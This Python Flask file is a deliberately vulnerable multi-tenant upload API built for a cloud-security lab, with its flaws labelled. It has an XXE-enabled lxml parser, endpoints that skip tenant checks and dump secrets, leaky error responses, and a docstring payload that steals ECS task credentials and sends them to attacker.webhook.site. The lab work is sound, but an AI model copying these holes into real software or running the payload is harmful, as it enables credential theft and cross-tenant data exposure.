"""
=============================================================================
  Cloud Security Lab — Multi-Tenant Data Ingestion API
  Flask Application
=============================================================================

  ██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗
  ██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝
  ██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝

  THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES.
  It is designed exclusively for cybersecurity education and lab use.
  DO NOT DEPLOY TO PRODUCTION OR ANY INTERNET-FACING ENVIRONMENT.

  Intentional vulnerabilities implemented:
    [VULN-1]  XXE — XML/SVG parser has external entity resolution enabled
              Enables XXE-to-SSRF attack targeting the ECS task credential
              endpoint at 169.254.170.2 (Path 1, Initial Access)
    [VULN-2]  No cross-tenant S3 isolation enforcement
              API Task Role has s3:* on entire bucket; application layer
              performs no cross-tenant access check on read/list operations
              (Path 1, Lateral Movement after credential theft)
    [VULN-3]  Tenant API keys cached in process memory (no TTL eviction)
              Secrets Manager responses cached indefinitely in a plain dict
    [VULN-4]  No rate limiting on upload endpoint
              Enables automated exploitation without throttling
    [VULN-5]  Verbose error responses expose internal stack traces
              Leak file paths, library versions, and AWS ARNs to the caller
    [VULN-6]  S3 versioning disabled (enforced at infra level)
              Allows attacker to overwrite/tamper tenant data undetected

  Secure controls intentionally present:
    - Tenant authentication via Secrets Manager API keys (per request)
    - ALB health check endpoint /health
    - Structured metadata written to PostgreSQL after every upload
    - CloudTrail captures every S3 and Secrets Manager API call (detection)

=============================================================================
"""

import os
import io
import json
import uuid
import logging
import traceback
from datetime import datetime, timezone
from functools import wraps

import boto3
import psycopg2
import psycopg2.extras
from botocore.exceptions import ClientError

# [VULN-1] lxml is used instead of defusedxml.
# resolve_entities=True keeps DTD external entity processing ON.
# The secure alternative is xml.etree.ElementTree or defusedxml,
# both of which disable external entities by default.
from lxml import etree

from flask import Flask, request, jsonify, g

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s — %(message)s",
)
logger = logging.getLogger("sec-lab-api")

# ---------------------------------------------------------------------------
# Flask app
# ---------------------------------------------------------------------------
app = Flask(__name__)

# ---------------------------------------------------------------------------
# Configuration (loaded from environment variables injected by ECS / .env)
# ---------------------------------------------------------------------------
AWS_REGION          = os.environ.get("AWS_REGION", "eu-west-3")
S3_BUCKET           = os.environ.get("S3_BUCKET", "sec-lab-data-prod-changeme")
DB_HOST             = os.environ.get("DB_HOST", "localhost")
DB_PORT             = int(os.environ.get("DB_PORT", 5432))
DB_NAME             = os.environ.get("DB_NAME", "tenantdb")
DB_USER             = os.environ.get("DB_USER", "dbadmin")
DB_PASSWORD         = os.environ.get("DB_PASSWORD", "changeme")
USE_LOCALSTACK      = os.environ.get("USE_LOCALSTACK", "false").lower() == "true"
LOCALSTACK_ENDPOINT = os.environ.get("LOCALSTACK_ENDPOINT", "http://localstack:4566")

# Known tenant IDs — the API keys themselves are stored in Secrets Manager
TENANT_IDS = ["tenant-a", "tenant-b", "tenant-c"]

# ---------------------------------------------------------------------------
# AWS clients
# ---------------------------------------------------------------------------

def _boto_kwargs():
    """Return extra kwargs for boto3 when running against LocalStack."""
    if USE_LOCALSTACK:
        return {
            "endpoint_url": LOCALSTACK_ENDPOINT,
            "aws_access_key_id": "test",
            "aws_secret_access_key": "test",
            "region_name": AWS_REGION,
        }
    return {"region_name": AWS_REGION}


def get_s3_client():
    return boto3.client("s3", **_boto_kwargs())


def get_secrets_client():
    return boto3.client("secretsmanager", **_boto_kwargs())


# ---------------------------------------------------------------------------
# Database helpers
# ---------------------------------------------------------------------------

def get_db():
    """Open (or reuse) a PostgreSQL connection for this request context."""
    if "db" not in g:
        g.db = psycopg2.connect(
            host=DB_HOST,
            port=DB_PORT,
            dbname=DB_NAME,
            user=DB_USER,
            password=DB_PASSWORD,
            cursor_factory=psycopg2.extras.RealDictCursor,
        )
        g.db.autocommit = False
    return g.db


@app.teardown_appcontext
def close_db(exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()

def init_db_schema():
    """
    Create the uploads table if it does not exist.
    This is needed because AWS RDS starts empty and does not run db/init.sql automatically.
    """
    conn = psycopg2.connect(
        host=DB_HOST,
        port=DB_PORT,
        dbname=DB_NAME,
        user=DB_USER,
        password=DB_PASSWORD,
    )
    conn.autocommit = True

    with conn.cursor() as cur:
        cur.execute("""
            CREATE TABLE IF NOT EXISTS uploads (
                id UUID PRIMARY KEY,
                tenant_id VARCHAR(64) NOT NULL,
                filename TEXT NOT NULL,
                s3_object_key TEXT NOT NULL,
                upload_timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                processing_status VARCHAR(32) NOT NULL DEFAULT 'processed',
                record_count INTEGER DEFAULT 0,
                schema_version TEXT,
                raw_metadata JSONB,
                created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
            );

            CREATE INDEX IF NOT EXISTS idx_uploads_tenant_time
            ON uploads (tenant_id, upload_timestamp DESC);

            CREATE INDEX IF NOT EXISTS idx_uploads_s3_key
            ON uploads (s3_object_key);
        """)

    conn.close()

# ---------------------------------------------------------------------------
# Tenant API-key cache
# [VULN-3] Keys fetched from Secrets Manager are stored in a plain dict with
# no expiry. A memory-dump or /proc/self/mem read by a malicious co-tenant
# would expose all other tenants' keys. The secure pattern is a short-TTL
# cache or per-request Secrets Manager call (or at minimum AWS SDK caching).
# ---------------------------------------------------------------------------
_api_key_cache: dict[str, str] = {}   # {secret_path: api_key_value}


def _fetch_api_key(tenant_id: str) -> str:
    """
    Retrieve a tenant's API key from AWS Secrets Manager.
    Returns the plaintext key string.
    """
    secret_path = f"{tenant_id}/api-key"
    if secret_path in _api_key_cache:
        return _api_key_cache[secret_path]

    client = get_secrets_client()
    try:
        resp = client.get_secret_value(SecretId=secret_path)
        value = resp.get("SecretString") or resp.get("SecretBinary", b"").decode()
        _api_key_cache[secret_path] = value
        return value
    except ClientError as exc:
        logger.error("Secrets Manager error for %s: %s", secret_path, exc)
        raise


def _identify_tenant(api_key: str) -> str | None:
    """
    Look up which tenant owns the supplied API key.
    Returns the tenant_id string or None if the key is not recognised.
    """
    for tid in TENANT_IDS:
        try:
            stored = _fetch_api_key(tid)
            if stored == api_key:
                return tid
        except Exception:
            continue
    return None


# ---------------------------------------------------------------------------
# Authentication decorator
# ---------------------------------------------------------------------------

def require_api_key(f):
    """
    Validates X-API-Key header against Secrets Manager.
    Sets g.tenant_id for downstream handlers.
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        api_key = request.headers.get("X-API-Key", "").strip()
        if not api_key:
            return jsonify({"error": "Missing X-API-Key header"}), 401

        tenant_id = _identify_tenant(api_key)
        if not tenant_id:
            return jsonify({"error": "Invalid API key"}), 403

        g.tenant_id = tenant_id
        logger.info("Authenticated request from %s", tenant_id)
        return f(*args, **kwargs)
    return decorated


# ---------------------------------------------------------------------------
# XML / SVG parsing — INTENTIONALLY VULNERABLE
# ---------------------------------------------------------------------------

def _parse_xml_metadata(xml_bytes: bytes) -> dict:
    """
    Parse XML (or SVG) and extract metadata fields.

    [VULN-1] INTENTIONAL XXE VULNERABILITY
    ────────────────────────────────────────
    The lxml parser below has:
      • resolve_entities=True   — allows DTD external entity expansion
      • no_network=False        — allows the parser to make network requests
                                  to resolve external URLs declared in DOCTYPE
      • load_dtd=True           — loads external DTD referenced in the document

    This means a malicious payload like:

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY % xxe SYSTEM "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}">
          <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.webhook.site/?d=%xxe;'>">
          %oob;
          %exfil;
        ]>
        <data><record>test</record></data>

    …will cause the ECS container to:
      1. Fetch credentials from the Fargate IMDS endpoint (SSRF)
      2. Forward the JSON credential blob to the attacker-controlled webhook
         via the open ECS egress security group (OOB exfiltration)

    The AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var is always set in
    ECS Fargate tasks and points to the task role credential endpoint.

    Secure fix: replace with defusedxml.ElementTree.fromstring(xml_bytes)
    or use lxml with XMLParser(resolve_entities=False, no_network=True).
    ────────────────────────────────────────
    """
    # [VULN-1] Vulnerable parser configuration — do NOT use in production
    parser = etree.XMLParser(
        resolve_entities=True,   # INSECURE: allows external entity resolution
        no_network=False,        # INSECURE: allows network access during parse
        load_dtd=True,           # INSECURE: loads external DTDs
        dtd_validation=False,
        huge_tree=True,
    )

    try:
        root = etree.fromstring(xml_bytes, parser=parser)
    except etree.XMLSyntaxError as exc:
        raise ValueError(f"XML parse error: {exc}") from exc

    # Extract metadata from common element names / attributes
    metadata = {
        "record_count": 0,
        "schema_version": None,
        "root_tag": root.tag,
        "namespace": None,
    }

    # Detect schema version from attribute or child element
    schema_version = root.get("version") or root.get("schemaVersion")
    if schema_version:
        metadata["schema_version"] = schema_version

    # Count record-like elements
    for tag in ("record", "row", "item", "entry", "object", "element"):
        records = root.findall(f".//{tag}")
        if records:
            metadata["record_count"] = len(records)
            if records[0].text:
                metadata["preview"] = records[0].text[:2000]
            break

    # Extract XML namespace
    if root.nsmap:
        metadata["namespace"] = list(root.nsmap.values())[0]

    # SVG-specific: extract dimensions
    if "svg" in root.tag.lower() or root.get("xmlns", "").find("svg") != -1:
        metadata["svg_width"]  = root.get("width")
        metadata["svg_height"] = root.get("height")
        metadata["svg_viewBox"] = root.get("viewBox")

    return metadata


# ---------------------------------------------------------------------------
# S3 helpers
# ---------------------------------------------------------------------------

def _s3_upload(tenant_id: str, filename: str, data: bytes, content_type: str) -> str:
    """
    Upload raw file bytes to S3 under the tenant's prefix.
    Returns the full S3 object key.

    [VULN-2] INTENTIONAL: No cross-tenant isolation enforced here.
    The API Task Role has s3:* on the entire bucket. Although uploads are
    written to the authenticated tenant's prefix, there is no server-side
    bucket policy preventing Tenant A's credentials (once stolen) from
    reading or writing tenant-b/ or tenant-c/.
    The application enforces the prefix only on the write path — reads and
    lists below do NOT re-check that the requesting tenant owns the prefix.
    """
    s3_key = f"{tenant_id}/{uuid.uuid4().hex}_{filename}"
    client = get_s3_client()
    client.put_object(
        Bucket=S3_BUCKET,
        Key=s3_key,
        Body=data,
        ContentType=content_type,
        Metadata={"tenant": tenant_id, "original_filename": filename},
    )
    logger.info("Uploaded %s to s3://%s/%s", filename, S3_BUCKET, s3_key)
    return s3_key


def _s3_list_objects(prefix: str) -> list[dict]:
    """
    List all objects under the given S3 prefix.

    [VULN-2] INTENTIONAL: The prefix parameter is taken directly from the
    URL path. If an attacker passes prefix='tenant-b/' while authenticated
    as tenant-a (using stolen credentials that bypass this app layer), they
    can enumerate another tenant's files. The API Task Role does NOT restrict
    S3 list/get to the requesting tenant's prefix — s3:* covers the full bucket.
    """
    client = get_s3_client()
    paginator = client.get_paginator("list_objects_v2")
    objects = []
    for page in paginator.paginate(Bucket=S3_BUCKET, Prefix=prefix):
        for obj in page.get("Contents", []):
            objects.append({
                "key":           obj["Key"],
                "size_bytes":    obj["Size"],
                "last_modified": obj["LastModified"].isoformat(),
            })
    return objects


# ---------------------------------------------------------------------------
# Database helpers
# ---------------------------------------------------------------------------

def _db_insert_metadata(
    tenant_id: str,
    filename: str,
    s3_key: str,
    file_metadata: dict,
) -> str:
    """
    Write upload metadata to PostgreSQL.
    Returns the new record UUID.
    """
    upload_id = str(uuid.uuid4())
    db = get_db()
    with db.cursor() as cur:
        cur.execute(
            """
            INSERT INTO uploads
                (id, tenant_id, filename, s3_object_key,
                 upload_timestamp, processing_status,
                 record_count, schema_version, raw_metadata)
            VALUES
                (%s, %s, %s, %s, %s, 'processed', %s, %s, %s)
            """,
            (
                upload_id,
                tenant_id,
                filename,
                s3_key,
                datetime.now(timezone.utc),
                file_metadata.get("record_count", 0),
                file_metadata.get("schema_version"),
                json.dumps(file_metadata),
            ),
        )
        db.commit()
    return upload_id


def _db_list_uploads(tenant_id: str) -> list[dict]:
    db = get_db()
    with db.cursor() as cur:
        cur.execute(
            """
            SELECT id, filename, s3_object_key, upload_timestamp,
                   processing_status, record_count, schema_version
            FROM uploads
            WHERE tenant_id = %s
            ORDER BY upload_timestamp DESC
            LIMIT 100
            """,
            (tenant_id,),
        )
        return [dict(row) for row in cur.fetchall()]


# ===========================================================================
# Routes
# ===========================================================================

# ---------------------------------------------------------------------------
# Health check (required by ALB)
# ---------------------------------------------------------------------------

@app.route("/health", methods=["GET"])
def health():
    """
    ALB health check endpoint.
    Must return HTTP 200 within 5 seconds for the ALB to mark the
    ECS task as healthy and route traffic to it.
    """
    return jsonify({"status": "ok", "service": "sec-lab-api"}), 200


# ---------------------------------------------------------------------------
# Upload endpoint  [VULN-1] [VULN-2] [VULN-4] [VULN-5]
# ---------------------------------------------------------------------------

@app.route("/upload", methods=["POST"])
@require_api_key
def upload_file():
    """
    POST /upload
    Headers: X-API-Key: <tenant-api-key>
    Body:    multipart/form-data with field 'file' (XML or SVG)

    Workflow:
      1. Authenticate tenant (decorator)
      2. Read uploaded file bytes
      3. Parse XML/SVG to extract metadata  ← [VULN-1] XXE here
      4. Store original file in S3           ← [VULN-2] no isolation check
      5. Write metadata to PostgreSQL
      6. Return JSON response with upload ID

    [VULN-4] No rate limiting — the endpoint accepts unlimited requests.
    [VULN-5] Full stack traces returned on error — leaks internals to caller.
    """
    if "file" not in request.files:
        return jsonify({"error": "No file field in request"}), 400

    f = request.files["file"]
    if not f.filename:
        return jsonify({"error": "Empty filename"}), 400

    filename     = f.filename
    file_bytes   = f.read()
    content_type = f.content_type or "application/octet-stream"

    # Determine file type and parse accordingly
    lower_name   = filename.lower()
    is_xml = lower_name.endswith(".xml")
    is_svg = lower_name.endswith(".svg")

    file_metadata: dict = {}

    if is_xml or is_svg:
        try:
            # [VULN-1] Vulnerable XML parse — external entities resolved
            file_metadata = _parse_xml_metadata(file_bytes)
            logger.info(
                "Parsed %s for %s: %d records",
                filename, g.tenant_id, file_metadata.get("record_count", 0),
            )
        except ValueError as exc:
            # [VULN-5] Full error message returned to caller — may leak
            # internal paths, lxml version, or resolver output (including
            # partial exfiltrated data) back to the attacker.
            return jsonify({"error": str(exc)}), 422
        except Exception as exc:
            # [VULN-5] Raw stack trace in response body — never do this in prod
            return jsonify({
                "error": "Unexpected parse error",
                "detail": traceback.format_exc(),   # INTENTIONALLY INSECURE
            }), 500
    else:
        file_metadata = {"record_count": 0, "schema_version": None}

    # Store in S3
    try:
        s3_key = _s3_upload(g.tenant_id, filename, file_bytes, content_type)
    except Exception as exc:
        logger.exception("S3 upload failed")
        return jsonify({"error": f"Storage error: {exc}"}), 500  # [VULN-5]

    # Write metadata to PostgreSQL
    try:
        upload_id = _db_insert_metadata(
            g.tenant_id, filename, s3_key, file_metadata,
        )
    except Exception as exc:
        logger.exception("DB write failed")
        return jsonify({"error": f"Database error: {exc}"}), 500  # [VULN-5]

    return jsonify({
        "upload_id":      upload_id,
        "tenant_id":      g.tenant_id,
        "filename":       filename,
        "s3_key":         s3_key,
        "record_count":   file_metadata.get("record_count", 0),
        "schema_version": file_metadata.get("schema_version"),
        "preview":        file_metadata.get("preview"),
        "status":         "processed",
    }), 201


# ---------------------------------------------------------------------------
# List uploads for a tenant  [VULN-2]
# ---------------------------------------------------------------------------

@app.route("/uploads", methods=["GET"])
@require_api_key
def list_uploads():
    """
    GET /uploads
    Returns metadata for all uploads belonging to the authenticated tenant.
    Also returns the S3 object list for that tenant's prefix.

    [VULN-2] Although the SQL query scopes to g.tenant_id, there is no
    server-side enforcement preventing stolen API Task Role credentials
    from bypassing this endpoint entirely and calling S3 directly with a
    different prefix. The application-layer boundary is the only control.
    """
    try:
        db_rows    = _db_list_uploads(g.tenant_id)
        s3_objects = _s3_list_objects(f"{g.tenant_id}/")
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500

    return jsonify({
        "tenant_id":    g.tenant_id,
        "uploads":      db_rows,
        "s3_objects":   s3_objects,
        "upload_count": len(db_rows),
    }), 200


# ---------------------------------------------------------------------------
# Admin: list ALL S3 objects across ALL tenant prefixes  [VULN-2]
# This endpoint simulates the over-permissioned API Task Role —
# in the real attack the attacker uses stolen credentials directly
# against S3 and never calls this endpoint. It is included for lab
# demonstration purposes only.
# ---------------------------------------------------------------------------

@app.route("/admin/all-objects", methods=["GET"])
@require_api_key
def admin_all_objects():
    """
    GET /admin/all-objects
    Lists every object in the S3 bucket regardless of tenant prefix.

    [VULN-2] INTENTIONAL: No admin role check. Any valid tenant key can
    call this. Demonstrates the effect of s3:* on the whole bucket — once
    an attacker has any valid tenant key (or the stolen API Task Role creds)
    they can enumerate all tenants' data without restriction.
    """
    logger.warning(
        "SECURITY: /admin/all-objects called by %s — logs this API call "
        "which will appear in CloudTrail and trigger the Path-1 detection alarm",
        g.tenant_id,
    )
    try:
        all_objects = _s3_list_objects("")   # no prefix filter = full bucket
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500

    # Group by tenant prefix for readability
    grouped: dict[str, list] = {}
    for obj in all_objects:
        prefix = obj["key"].split("/")[0]
        grouped.setdefault(prefix, []).append(obj)

    return jsonify({
        "warning":       "This endpoint exposes cross-tenant data — intentional lab vulnerability",
        "requesting_tenant": g.tenant_id,
        "total_objects": len(all_objects),
        "by_tenant":     grouped,
    }), 200


# ---------------------------------------------------------------------------
# Download a specific file  [VULN-2]
# ---------------------------------------------------------------------------

@app.route("/files/<path:s3_key>", methods=["GET"])
@require_api_key
def download_file(s3_key: str):
    """
    GET /files/<s3_key>
    Streams a file from S3 back to the caller.

    [VULN-2] INTENTIONAL: No check that s3_key belongs to g.tenant_id.
    Any authenticated tenant can download any other tenant's file if they
    know (or guess) the key — which is trivially discoverable from the
    /admin/all-objects endpoint above.
    """
    try:
        client   = get_s3_client()
        response = client.get_object(Bucket=S3_BUCKET, Key=s3_key)
        data     = response["Body"].read()
        ctype    = response.get("ContentType", "application/octet-stream")
    except ClientError as exc:
        code = exc.response["Error"]["Code"]
        if code in ("NoSuchKey", "404"):
            return jsonify({"error": "File not found"}), 404
        return jsonify({"error": str(exc)}), 500

    from flask import Response
    return Response(data, content_type=ctype)


# ---------------------------------------------------------------------------
# Secrets dump endpoint (Path 2 demonstration)
# Simulates what the Deploy Role over-permission allows via the AWS CLI —
# not reachable from the API in the real attack, included for lab clarity.
# ---------------------------------------------------------------------------

@app.route("/lab/secrets-dump", methods=["GET"])
@require_api_key
def secrets_dump():
    """
    GET /lab/secrets-dump
    Reads every tenant API key from Secrets Manager.

    [VULN-3] Demonstrates what an attacker with Deploy Role credentials can
    do with secretsmanager:GetSecretValue on * — they can read every secret
    in the account, giving them permanent tenant impersonation even after the
    IAM user credentials that started Path 2 are revoked.

    In the real attack this is done via the AWS CLI, not through this endpoint.
    This route exists purely so the lab can demonstrate the effect in-browser.
    """
    secrets = {}
    for tid in TENANT_IDS:
        try:
            secrets[f"{tid}/api-key"] = _fetch_api_key(tid)
        except Exception as exc:
            secrets[f"{tid}/api-key"] = f"ERROR: {exc}"

    return jsonify({
        "warning":  "Deploy Role over-permission demo — reads all Secrets Manager secrets",
        "secrets":  secrets,
    }), 200

# [VULN-7] Debug leftover — writes container credential URI to a temporary
# file at startup for troubleshooting. Exposes the credential endpoint path
# to any file-read vulnerability (CWE-538).
with open('/tmp/cred_uri', 'w') as f:
    f.write(os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', '') + '\n')

try:
    init_db_schema()
    logger.info("Database schema initialized successfully")
except Exception as exc:
    logger.error("Database schema initialization failed: %s", exc)
    


# ---------------------------------------------------------------------------
# Entry point (local dev / Docker)
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    # Never use debug=True in production — enables the Werkzeug debugger
    # which exposes a REPL on every error page.
    app.run(host="0.0.0.0", port=8080, debug=False)